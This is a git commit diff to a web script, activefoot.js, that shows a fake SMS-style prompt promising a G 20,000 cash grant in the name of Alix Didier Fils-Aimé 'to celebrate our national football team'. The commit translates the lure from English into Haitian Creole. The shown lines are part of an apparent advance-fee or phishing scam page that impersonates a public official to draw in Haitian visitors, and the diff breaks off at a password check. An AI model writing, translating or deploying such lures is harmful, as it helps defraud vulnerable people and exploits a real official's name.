9c5bd2accaa2b94fb5c8c989cc525a1c1ab710fb
Help-All <imaobongumoh637@gmail.com>
2026-06-24 02:13:14 +0100

    Update activefoot.js

--- activefoot.js
+++ activefoot.js
@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'G 20,000'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive ALIX DIDIER FILS-AIMÉ G 20,000 CASH SUPPORT GRANT TO CELEBRATE OUR NATIONAL FOOTBALL TEAM. Please press OK to Receive Instantly.',
+  'SMS: Felisitasyon! Ou kalifye pou resevwa ALIX DIDIER FILS-AIMÉ G 20,000 SIBVANSYON SIPÒ LAJAN KACH POU SELEBRE EKIP NASYONAL FOUTBÒL LA. Tanpri peze OK pou resevwa li touswit.',
   'G 20,000'
 );
 if (password != 'G 20,000') {
